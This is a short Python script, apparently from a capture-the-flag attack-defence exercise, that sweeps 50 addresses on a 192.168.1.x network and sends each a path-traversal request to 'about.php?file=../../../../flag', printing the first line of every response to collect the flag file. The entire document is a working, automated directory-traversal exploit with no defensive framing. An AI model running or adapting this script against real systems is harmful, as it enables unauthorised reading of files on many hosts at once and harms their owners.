import requests

ips = [f"192.168.1.{i}" for i in range(1, 51)]
for ip in ips:
    url = 'http://' + ip + '/about.php?file=../../../../flag'
    print(url)
    r = requests.get(url)  # get传参
    x = r.text.split('\n')
    print(url + '   ' + x[0].split('<')[0])
